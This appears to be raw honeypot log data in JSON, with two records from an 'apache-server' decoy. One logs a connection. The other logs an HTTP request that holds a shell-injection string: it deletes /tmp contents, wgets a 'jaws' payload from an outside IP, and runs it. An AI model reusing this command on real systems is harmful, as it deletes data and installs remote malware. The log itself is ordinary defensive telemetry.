{"customerid":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413","honeyserverid":"2102ac15-bf5e-456c-ab63-90cb836ed7ad","logkind":"connection","honeypotid":"8BE585FB-2F2F-4BC6-8848-4165C1C4AA46","honeypotname":"apache-server","time":"2023-03-05T22:52:21.974401","parsedMessage":{"timestamp":"2023-03-05 22:52:21.974401","message_type":null,"correlation_id":null,"level":"INFO","message":"connection-log connection from 14.45.183.39:55415 to port 80","ip":"14.45.183.39"},"id":"63629e89-bcc6-41cd-9ce6-28ba620387ae","EventProcessedUtcTime":"2023-03-05T22:52:22.4691605Z","PartitionId":0,"EventEnqueuedUtcTime":"2023-03-05T22:52:22.2830000Z","path":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413/2102ac15-bf5e-456c-ab63-90cb836ed7ad/apache-server/14.45.183.39"}
{"customerid":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413","honeyserverid":"2102ac15-bf5e-456c-ab63-90cb836ed7ad","logkind":"honeypot","honeypotid":"8BE585FB-2F2F-4BC6-8848-4165C1C4AA46","honeypotname":"apache-server","time":"Sun Mar  5 22:53:01 UTC 2023","parsedMessage":{"timestamp":"2023-03-05 22:52:21+00:00","message_type":"http-access","correlation_id":null,"level":"WARNING","message":"14.45.183.39 - - \"GET /shell?cd+/tmp;rm+-rf+*;wget+ 103.215.81.11/jaws;chmod+/tmp/jaws;sh+/tmp/jaws\" 400 0 \"-\" \"-\"","ip":"14.45.183.39"},"id":"821d0bb5-1b9e-4dc8-a4d5-ccbb1a2e2f02","EventProcessedUtcTime":"2023-03-05T22:53:02.3127233Z","PartitionId":0,"EventEnqueuedUtcTime":"2023-03-05T22:53:02.1000000Z","path":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413/2102ac15-bf5e-456c-ab63-90cb836ed7ad/apache-server/14.45.183.39"}